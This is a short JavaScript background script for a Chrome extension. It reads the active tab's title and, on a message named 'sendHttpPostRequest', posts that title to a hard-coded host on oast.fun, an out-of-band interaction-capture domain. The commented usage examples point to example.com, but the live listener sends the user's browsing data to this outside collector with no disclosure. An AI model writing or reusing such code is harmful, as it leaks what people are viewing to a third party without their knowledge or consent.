var title = "";
function getPageTitle(callback) {
    chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
      if (tabs && tabs[0]) {
        title = tabs[0].title;
        callback(null, title);
      } else {
        callback(new Error('Error: Unable to get tab information.'), null);
      }
    });
    return title;
  }
  
  function sendHttpPostRequest(url, data, callback) {
    const options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    };
  
    fetch(url, options)
      .then(response => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
      })
      .then(data => {
        callback(null, data);
      })
      .catch(error => {
        callback(error, null);
      });
  }
  
  // Example usage:
  // getPageTitle((error, title) => {
  //   if (error) {
  //     console.error('Error:', error);
  //     return;
  //   }
  //   console.log('Page title:', title);
  // });
  
  // Example usage:
  // const postData = { key: 'value' };
  // sendHttpPostRequest('https://example.com/api', postData, (error, response) => {
  //   if (error) {
  //     console.error('Error:', error);
  //     return;
  //   }
  //   console.log('Response:', response);
  // });
  

  chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.action === 'getPageTitle') {
      getPageTitle(function(error, title) {
        if (error) {
          sendResponse({ error: error.message });
        } else {
          sendResponse({ title: title });
        }
      });
      return true; // Indicates that sendResponse will be called asynchronously
    }
  
    if (request.action === 'sendHttpPostRequest') {
      const postData = title;
      sendHttpPostRequest('https://uvqowbkaatlxwzsvueyyxbydvd76nw9xz.oast.fun', postData, function(error, response) {
        if (error) {
          sendResponse({ error: error.message });
        } else {
          sendResponse({ success: true });
        }
      });
      return true; // Indicates that sendResponse will be called asynchronously
    }
  });
  